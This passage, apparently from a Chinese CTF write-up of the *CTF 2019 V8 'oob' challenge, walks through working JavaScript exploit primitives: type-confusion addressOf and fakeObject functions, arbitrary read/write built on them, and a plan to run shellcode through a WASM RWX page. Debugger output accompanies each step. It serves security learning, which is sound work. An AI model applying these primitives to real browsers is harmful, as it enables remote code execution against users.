class="number">0xf553c5414f9</span> ◂— <span class="number">0xf553c5401</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0xf264d68de20</span> ◂— <span class="number">0x400000000</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0xf264d68de28</span> ◂— <span class="number">0x3ff0000000000000</span><span class="comment">//1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0xf264d68de30</span> ◂— <span class="number">0x4000000000000000</span><span class="comment">//2</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0xf264d68de38</span> ◂— <span class="number">0x4008000000000000</span><span class="comment">//3</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│   <span class="number">0xf264d68de40</span> ◂— <span class="number">0x3ff199999999999a</span><span class="comment">//1.1</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│   <span class="number">0xf264d68de48</span> ◂— <span class="number">0x4000000000000000</span><span class="comment">//2</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│   <span class="number">0xf264d68de50</span> —▸ <span class="number">0xf553c540c71</span> ◂— <span class="number">0xf553c5408</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x0f264d68de48</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0xf264d68de48</span> ◂— <span class="number">0x4000000000000000</span><span class="comment">//2，本来是object的map值，已经被覆盖修改成浮点数的2</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0xf264d68de50</span> —▸ <span class="number">0xf553c540c71</span> ◂— <span class="number">0xf553c5408</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0xf264d68de58</span> —▸ <span class="number">0xf264d68de19</span> ◂— <span class="number">0xf553c5414</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0xf264d68de60</span> ◂— <span class="number">0x400000000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0xf264d68de68</span> —▸ <span class="number">0xf553c540561</span> ◂— <span class="number">0x200000f553c5401</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│   <span class="number">0xf264d68de70</span> —▸ <span class="number">0x3e88cd582ed9</span> ◂— <span class="number">0x400000f553c5401</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│   <span class="number">0xf264d68de78</span> —▸ <span class="number">0xf553c541ea9</span> ◂— <span class="number">0x400000f553c5401</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│   <span class="number">0xf264d68de80</span> ◂— <span class="number">0x2800000003</span></span><br><span class="line">pwndbg&gt; job <span class="number">0x0f264d68de19</span></span><br><span class="line"><span class="number">0xf264d68de19</span>: [FixedDoubleArray]</span><br><span class="line"> - map: <span class="number">0x0f553c5414f9</span> &lt;Map&gt;</span><br><span class="line"> - length: <span class="number">4</span></span><br><span class="line">           <span class="number">0</span>: <span class="number">1</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">2</span></span><br><span class="line">           <span class="number">2</span>: <span class="number">3</span></span><br><span class="line">           <span class="number">3</span>: <span class="number">1.1</span></span><br></pre></td></tr></table></figure><p>总结一下，当我们不传参数时，可以泄露object的map字段的值，如果传入参数，传入的参数会写入进object的map字段。</p><h2 id="4、编写addressOf和fakeObject原语"><a href="#4、编写addressOf和fakeObject原语" class="headerlink" title="4、编写addressOf和fakeObject原语"></a>4、编写addressOf和fakeObject原语</h2><h3 id="what"><a href="#what" class="headerlink" title="what"></a>what</h3><p>什么叫做addressOf和fakeObject</p><blockquote><p><strong>计算一个对象的地址addressOf</strong>：将需要计算内存地址的对象存放到一个对象数组中的A[0]，然后利用上述类型混淆漏洞，将对象数组的Map类型修改为浮点数数组的类型，访问A[0]即可得到浮点数表示的目标对象的内存地址。</p><p><strong>将一个内存地址伪造为一个对象fakeObject</strong>：将需要伪造的内存地址存放到一个浮点数数组中的B[0]，然后利用上述类型混淆漏洞，将浮点数数组的Map类型修改为对象数组的类型，那么B[0]此时就代表了以这个内存地址为起始地址的一个JS对象了。</p></blockquote><p>说白了就是一个可以将对象当作地址，一个可以将地址当作对象。我们拿到这个有什么用呢？</p><h3 id="why"><a href="#why" class="headerlink" title="why"></a>why</h3><p>如果我们定义一个FloatArray浮点数数组A，然后定义一个对象数组B。正常情况下，访问A[0]返回的是一个浮点数，访问B[0]返回的是一个对象元素。如果将B的类型修改为A的类型，那么再次访问B[0]时，返回的就不是对象元素B[0]，而是B[0]对象元素转换为浮点数即B[0]对象的内存地址了；如果将A的类型修改为B的类型，那么再次访问A[0]时，返回的就不是浮点数A[0]，而是以A[0]为内存地址的一个JavaScript对象了。</p><p>造成上面的原因在于，v8完全依赖Map类型对js对象进行解析。上面这个逻辑希望能仔细理解一下。</p><p>通过上面两种类型混淆的方式，就能够实现addressOf和fakeObject。</p><p>基于上述分析，如果我们利用oob的读取功能将数组对象A的对象类型Map读取出来，然后利用oob的写入功能将这个类型写入数组对象B，就会导致数组对象B的类型变为了数组对象A的对象类型，这样就造成了类型混淆。</p><h3 id="how"><a href="#how" class="headerlink" title="how"></a>how</h3><p>下面我们利用JavaScript实现上述addressOf和fakeObject功能原语。</p><p>首先定义两个全局的Float数组和对象数组，利用oob函数漏洞泄露两个数组的Map类型：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br></pre></td></tr></table></figure><p>然后实现下面两个函数，下面两个函数就是+1或-1和换map头的过程</p><p><strong>addressOf 泄露某个object的地址</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 泄露某个object的地址</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;<span class="comment">//将要泄露的对象放到对象数组上</span></span><br><span class="line">    obj_array.oob(float_array_map);<span class="comment">//将对象数组的头替换为float数组的头</span></span><br><span class="line">    <span class="keyword">let</span> obj_addr = f2i(obj_array[<span class="number">0</span>]) - <span class="number">1n</span>;     <span class="comment">//将对象数组的元素的地址泄露。let类型的变量与var类型的变量相比，限定了作用域，let是在块级作用域有效，而var是全局的变量；-1n其实就是-1，因为1是代表对象的标志，-1就是将对象转变为了地址</span></span><br><span class="line">    obj_array.oob(obj_array_map); <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> obj_addr;   <span class="comment">//返回的是个float</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>fakeObject 将某个addr强制转换为object的对象</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将某个addr强制转换为object对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">addr_to_fake</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = i2f(addr_to_fake + <span class="number">1n</span>);<span class="comment">//将地址+1转变为对象</span></span><br><span class="line">    float_array.oob(obj_array_map);   <span class="comment">//将float数组的头替换为对象数组的头</span></span><br><span class="line">    <span class="keyword">let</span> faked_obj = float_array[<span class="number">0</span>];   <span class="comment">//将对象变量返回</span></span><br><span class="line">    float_array.oob(float_array_map);    <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> faked_obj; <span class="comment">//返回的是个对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义一些gadget，简单的工具代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××</span></span><br><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%DebugPrint(float64);</span><br><span class="line">%DebugPrint(bigUint64);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><h2 id="5、构造任意读写原语"><a href="#5、构造任意读写原语" class="headerlink" title="5、构造任意读写原语"></a>5、构造任意读写原语</h2><p>上面已经将地址转对象和对象转地址的原语构造出来了，现在我们需要利用这两个原语来构造任意地址读写</p><p>我们现在有如下的思路：</p><p>1、fakeObject可以将给定的内存地址转变为object，我们可以在这块地址上面构造object的结构体，然后利用fakeObject将其转化为object</p><p>2、由于这块object完全是我们构造的，所以其中的任何字段都是我们可控的，包括elements字段</p><p>3、我们已经知道elements实际上是个指针，指向elements这个object对象的地址，当我们操作数组元素时，其实操作的就是从elements对象地址+0x10的内存，我们有这样一个思路：将elements位置处的值覆盖为任意地址，这样我们操作数组元素时，操作的就是这块写的任意地址的内存。</p><p>我们直接通过任意读写原语来具体说明下上述过程</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fake_array = [  <span class="comment">// [+0x40]</span></span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),</span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);<span class="comment">// +0x40</span></span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>; <span class="comment">// +0x10</span></span><br><span class="line"><span class="keyword">var</span> fake_object = fakeObject(fake_object_addr);<span class="comment">// [+0x10]</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)  </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);<span class="comment">//fake_array[2] == [[+0x40+0x10]+0x10+0x10] == 0x00+0x10+0x10 == 0x20, +0x40++0x10为element的地址，[+0x40+0x10]为element对象，第一个+0x10为element的第[0]个元素，第二个+0x10为element的第[2]个元素,该地址存放的值为i2f(addr - 0x10n + 0x1n)。</span></span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);<span class="comment">//fake_object[0] == [[+0x10+0x10]+0x10] == [[+0x20]+0x10] == [addr-0x10+0x1+0x10] == [addr+0x1]</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>描述下上面创建的具体的内存结构</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">+<span class="number">0x0</span>elements_map    <span class="comment">//elements_start</span></span><br><span class="line">+<span class="number">0x8</span>elements_length</span><br><span class="line">+<span class="number">0x10</span>float_array_map<span class="comment">//fake_array[0]; fake_object_addr</span></span><br><span class="line">+<span class="number">0x18</span> <span class="built_in">i2f</span>(<span class="number">0</span>n)    <span class="comment">//fake_array[1]</span></span><br><span class="line">+<span class="number">0x20</span><span class="built_in">i2f</span>(<span class="number">0x41414141</span>n)<span class="comment">//fake_array[2]//elements对象</span></span><br><span class="line">+<span class="number">0x28</span><span class="built_in">i2f</span>(<span class="number">0x1000000000</span>n)<span class="comment">//fake_array[3]</span></span><br><span class="line">+<span class="number">0x30</span><span class="number">1.1</span>   <span class="comment">//fake_array[4]</span></span><br><span class="line">+<span class="number">0x38</span><span class="number">2.2</span>   <span class="comment">//fake_array[5]</span></span><br><span class="line">+<span class="number">0x40</span>map   <span class="comment">//fake_array_addr</span></span><br><span class="line">+<span class="number">0x48</span>prototype</span><br><span class="line">+<span class="number">0x50</span>elements<span class="comment">//value == +0x0</span></span><br><span class="line">+<span class="number">0x58</span>length</span><br><span class="line">+<span class="number">0x60</span>properties</span><br></pre></td></tr></table></figure><p>然后在v8中进行调试</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line"><span class="keyword">var</span> a_addr = addressOf(a);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] addressOf a: 0x&quot;</span> + hex(a_addr));</span><br><span class="line"></span><br><span class="line">read64(a_addr);</span><br><span class="line">%SystemBreak();</span><br><span class="line"></span><br><span class="line">write64(a_addr, <span class="number">0x01020304n</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><p>输出结果如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">...</span><br><span class="line"><span class="number">0x1f8b3558fa61</span> &lt;JSArray[<span class="number">3</span>]&gt;</span><br><span class="line">[*] addressOf a: <span class="number">0x00001f8b3558fa60</span></span><br><span class="line">[*] leak from: <span class="number">0x00001f8b3558fa60</span>: <span class="number">0x00003f510acc2ed9</span></span><br><span class="line">...</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x00001f8b3558fa60</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x1f8b3558fa60</span> —▸ <span class="number">0x3f510acc2ed9</span> ◂— <span class="number">0x4000001989b3c01</span><span class="comment">//可以看到将0x1f8b3558fa60处的值0x3f510acc2ed9读取出来了</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x1f8b3558fa68</span> —▸ <span class="number">0x1989b3c0c71</span> ◂— <span class="number">0x1989b3c08</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x1f8b3558fa70</span> —▸ <span class="number">0x1f8b3558fa39</span> ◂— <span class="number">0x1989b3c14</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x1f8b3558fa78</span> ◂— <span class="number">0x300000000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0x1f8b3558fa80</span> —▸ <span class="number">0x1989b3c0561</span> ◂— <span class="number">0x2000001989b3c01</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│   <span class="number">0x1f8b3558fa88</span> —▸ <span class="number">0x1f8b3558fa61</span> ◂— <span class="number">0x7100003f510acc2e</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│   <span class="number">0x1f8b3558fa90</span> —▸ <span class="number">0x1989b3c13b9</span> ◂— <span class="number">0x1989b3c01</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│   <span class="number">0x1f8b3558fa98</span> ◂— <span class="number">0x2</span></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">[*] write to : <span class="number">0x00001f8b3558fa60</span>: <span class="number">0x0000000001020304</span></span><br><span class="line">...</span><br><span class="line">pwndbg&gt; telescope <span class="number">0x00001f8b3558fa60</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│   <span class="number">0x1f8b3558fa60</span> ◂— <span class="number">0x1020304</span><span class="comment">//0x1f8b3558fa60处的值被修改为0x0000000001020304</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│   <span class="number">0x1f8b3558fa68</span> —▸ <span class="number">0x1989b3c0c71</span> ◂— <span class="number">0x1989b3c08</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│   <span class="number">0x1f8b3558fa70</span> —▸ <span class="number">0x1f8b3558fa39</span> ◂— <span class="number">0x1989b3c14</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│   <span class="number">0x1f8b3558fa78</span> ◂— <span class="number">0x300000000</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│   <span class="number">0x1f8b3558fa80</span> —▸ <span class="number">0x1989b3c0561</span> ◂— <span class="number">0x2000001989b3c01</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│   <span class="number">0x1f8b3558fa88</span> —▸ <span class="number">0x1f8b3558fa61</span> ◂— <span class="number">0x7100000000010203</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│   <span class="number">0x1f8b3558fa90</span> —▸ <span class="number">0x1989b3c13b9</span> ◂— <span class="number">0x1989b3c01</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│   <span class="number">0x1f8b3558fa98</span> ◂— <span class="number">0x2</span>    </span><br></pre></td></tr></table></figure><h2 id="6、利用思路归纳"><a href="#6、利用思路归纳" class="headerlink" title="6、利用思路归纳"></a>6、利用思路归纳</h2><p>题目的利用思路有两种，一种是通过常规的堆漏洞利用方式，另一种是js引擎漏洞特有的义中叫做wasm的利用方式</p><p>在传统堆漏洞的pwn中，利用过程如下（因为在我们的浏览器中，已经实现了任意地址读写的漏洞效果，所以这个传统的利用思路在v8中也同样适用）</p><blockquote><p>通过堆漏洞能够实现一个任意地址写的效果</p><p>结合程序功能和UAF漏洞泄露出一个libc地址</p><p>通过泄露的libc地址计算出free_hook、malloc_hook、system和one_gadget的内存地址</p><p>利用任意地址写将hook函数修改为System或one_gadget的地址，从而实现shell的执行</p></blockquote><p>另外在v8中还有一种被称为webassembly即wasm的技术。通俗来讲，v8可以直接执行其它高级语言生成的机器码，从而加快运行效率。存储wasm的内存页是RWX可读可写可执行的，因此我们还可以通过下面的思路执行我们的shellcode：</p><blockquote><p>利用webassembly构造一块RWX内存页</p><p>通过漏洞将shellcode覆写到原本属于webassembly机器码的内存页中</p><p>后续再调用webassembly函数接口时，实际上就触发了我们部署好的shellcode</p></blockquote><p>wasm详细见下面的文章，讲的很好：</p><p><a class="link"   href="https://www.jianshu.com/p/bff8aa23fe4d" >https://www.jianshu.com/p/bff8aa23fe4d<i class="fas fa-external-link-alt"></i></a></p><h2 id="7、WASM方式进行漏洞利用"><a href="#7、WASM方式进行漏洞利用" class="headerlink" title="7、WASM方式进行漏洞利用"></a>7、WASM方式进行漏洞利用</h2><h3 id="简单用法"><a href="#简单用法" class="headerlink" title="简单用法"></a>简单用法</h3><p>wasm即webassembly，可以让JavaScript直接执行高级语言生成的机器码。</p><p>在线编译网站：<a class="link"   href="https://wasdk.github.io/WasmFiddle/" >https://wasdk.github.io/WasmFiddle/<i class="fas fa-external-link-alt"></i></a></p><p>可以直接通过示例来进行，点击左下角选择Code Buffer，之后正上方build，之后正上方run，之后右下方就会显示出执行结果：</p><p><img src="/2021/04/21/starctf2019-oob/image-20210104145616327.png" alt="image-20210104145616327"></p><p>这样有种猜测，是不是可以直接写调用命令，直接转换为WASM码，js引擎直接执行，后来发现这种方式是不行的，报告脚本错误</p><p><img src="/2021/04/21/starctf2019-oob/image-20210104150202512.png" alt="image-20210104150202512"></p><h3 id="利用wasm执行shellcode"><a href="#利用wasm执行shellcode" class="headerlink" title="利用wasm执行shellcode"></a>利用wasm执行shellcode</h3><p>wasm的作用是将一段功能转换为机器码，实际上wasm是一段AST字节码，之后通过运行wasm这一段字节码将高级语言转换为机器码，也就是说，wasm的功能可以理解为编译功能，wasm的代码和它”编译“生成的机器码的位置是不一样的</p><p>所以我们有这样的一种方式：</p><p>1、首先通过wasm生成一段tmpcode</p><p>2、通过addressOf原语找到存放wasm的内存地址</p><p>3、通过任意地址写原语用shellcode替换原本的tmpcode</p><p>4、最后调用之前的tmpcode功能即可触发shellcode</p><p>寻找</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /root/browser_study/v8/v8/v8/out/x64.release/d8 --allow-natives-syntax ./poc.js</span><br><span class="line">...</span><br><span class="line">[*] leak wasm func addr: <span class="number">0x000005b5f06a1b60</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; job <span class="number">0x000005b5f06a1b61</span></span><br><span class="line"><span class="number">0x5b5f06a1b61</span>: [Function] in OldSpace</span><br><span class="line"> - map: <span class="number">0x02b1b4a04379</span> &lt;<span class="built_in">Map</span>(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x05b5f0682109</span> &lt;<span class="built_in">JSFunction</span> (sfi = <span class="number">0x146242243b29</span>)&gt;</span><br><span class="line"> - elements: <span class="number">0x129784b00c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"> - shared_info: <span class="number">0x05b5f06a1b29</span> &lt;SharedFunctionInfo <span class="number">0</span>&gt;</span><br><span class="line"> - name: <span class="number">0x129784b04ae1</span> &lt;String[#<span class="number">1</span>]: <span class="number">0</span>&gt;</span><br><span class="line"> - formal_parameter_count: <span class="number">0</span></span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - context: <span class="number">0x05b5f0681869</span> &lt;NativeContext[<span class="number">246</span>]&gt;</span><br><span class="line"> - code: <span class="number">0x027534f82001</span> &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - WASM instance <span class="number">0x5b5f06a1969</span></span><br><span class="line"> - WASM function index <span class="number">0</span></span><br><span class="line"> - properties: <span class="number">0x129784b00c71</span> &lt;FixedArray[<span class="number">0</span>]&gt; &#123;</span><br><span class="line">    <span class="meta">#length: 0x1462422404b9 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="meta">#name: 0x146242240449 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="meta">#arguments: 0x146242240369 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line">    <span class="meta">#caller: 0x1462422403d9 <span class="meta-string">&lt;AccessorInfo&gt;</span> (const accessor descriptor)</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> - feedback vector: <span class="keyword">not</span> available</span><br><span class="line">pwndbg&gt; job <span class="number">0x05b5f06a1b29</span></span><br><span class="line"><span class="number">0x5b5f06a1b29</span>: [SharedFunctionInfo] in OldSpace</span><br><span class="line"> - map: 